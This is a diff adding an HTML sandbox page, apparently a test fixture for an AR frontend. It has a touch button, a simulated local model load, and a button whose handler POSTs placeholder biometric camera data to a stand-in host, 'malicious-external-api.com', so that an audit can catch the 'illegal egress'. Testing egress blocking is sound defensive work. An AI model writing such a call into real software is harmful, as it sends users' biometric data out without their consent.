@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AR Trion Test Page</title>
+    <style>
+        body { font-family: sans-serif; padding: 20px; }
+        .touch-target {
+            width: 200px;
+            height: 100px;
+            background: #007bff;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            cursor: pointer;
+        }
+        #status { font-weight: bold; }
+    </style>
+</head>
+<body>
+    <h1>AR Trion Frontend Sandbox</h1>
+
+    <div id="touch-button" class="touch-target">
+        Touch Me
+    </div>
+
+    <button id="load-model">Load Edge ML Model</button>
+    <button id="send-data" style="background: red; color: white;">Send Biometric Data (Test Block)</button>
+
+    <div style="margin-top: 20px;">
+        Status: <span id="status">Waiting...</span>
+    </div>
+
+    <script>
+        // Simulate touch event
+        const touchBtn = document.getElementById('touch-button');
+        const statusEl = document.getElementById('status');
+
+        // Handle both click and touchstart for testing
+        touchBtn.addEventListener('click', () => {
+            statusEl.textContent = 'Touched!';
+        });
+        touchBtn.addEventListener('touchstart', (e) => {
+            e.preventDefault();
+            statusEl.textContent = 'Touched via touch event!';
+        });
+
+        // Simulate edge ML model loading within the device
+        document.getElementById('load-model').addEventListener('click', async () => {
+            statusEl.textContent = 'Loading model...';
+
+            try {
+                // Simulate fetching a local model (this should not trigger an external egress alert if handled correctly in tests, or we mock it)
+                // For the test, we'll just delay and resolve
+                await new Promise(r => setTimeout(r, 500));
+                statusEl.textContent = 'Model Loaded Successfully (Local)';
+            } catch (err) {
+                statusEl.textContent = 'Model Load Failed';
+            }
+        });
+
+        // Simulate an illegal egress attempt (should be blocked by our audit)
+        document.getElementById('send-data').addEventListener('click', () => {
+            fetch('https://malicious-external-api.com/upload-camera-frame', {
+                method: 'POST',
+                body: JSON.stringify({
+                    type: 'biometric',
+                    frame_data: 'base64_encoded_image_data_here'
+                })
+            }).catch(() => {
+                // Ignore network errors in the UI, the test will catch the request
+            });
+        });
+    </script>
+</body>
+</html>
